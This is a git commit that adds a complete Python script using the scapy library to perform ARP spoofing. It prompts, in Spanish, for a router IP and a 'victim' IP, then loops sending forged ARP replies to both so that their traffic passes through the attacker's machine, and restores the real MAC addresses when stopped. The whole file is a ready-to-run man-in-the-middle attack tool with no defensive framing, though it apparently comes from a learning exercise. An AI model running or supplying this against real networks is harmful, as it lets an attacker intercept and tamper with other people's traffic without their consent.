fad5a567dc1f259e0937ad615e2724b79ab5c077
Saul Perez Ortiz <138555751+saul3312@users.noreply.github.com>
2024-06-30 20:56:59 -0600

    Create ARP_spoofing.py

---
+++ ARP_spoofing.py
@@ -0,0 +1,51 @@
+#!/usr/bin/python
+
+import scapy.all as scapy
+
+def restore_defaults(dest, source):
+    # getting the real MACs
+    target_mac = get_mac(dest) # 1st (router), then (windows)
+    source_mac = get_mac(source)
+    # creating the packet
+    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
+    # sending the packet
+    scapy.send(packet, verbose=False)
+
+def get_mac(ip):
+    # request that contain the IP destination of the target
+    request = scapy.ARP(pdst=ip)
+    # broadcast packet creation
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    # concat packets
+    final_packet = broadcast / request
+    # getting the response
+    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
+    # getting the MAC (its src because its a response)
+    mac = answer[0][1].hwsrc
+    return mac
+
+# we will send the packet to the target by pretending being the spoofed
+def spoofing(target, spoofed):
+    # getting the MAC of the target
+    mac = get_mac(target)
+    # generating the spoofed packet modifying the source and the target
+    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
+    # sending the packet
+    scapy.send(packet, verbose=False)
+
+def main():
+    router_ip = input("Introduce la IP del router: ")
+    victim_ip = input("Introduce la IP de la víctima: ")
+
+    try:
+        while True:
+            spoofing(router_ip, victim_ip) # router (source, dest -> attacker machine)
+            spoofing(victim_ip, router_ip) # win PC
+    except KeyboardInterrupt:
+        print("[!] Proceso detenido. Restaurando valores predeterminados... por favor espera")
+        restore_defaults(router_ip, victim_ip) # router (source, dest -> attacker machine)
+        restore_defaults(victim_ip, router_ip) # win PC
+        exit(0)
+
+if __name__ == "__main__":
+    main()
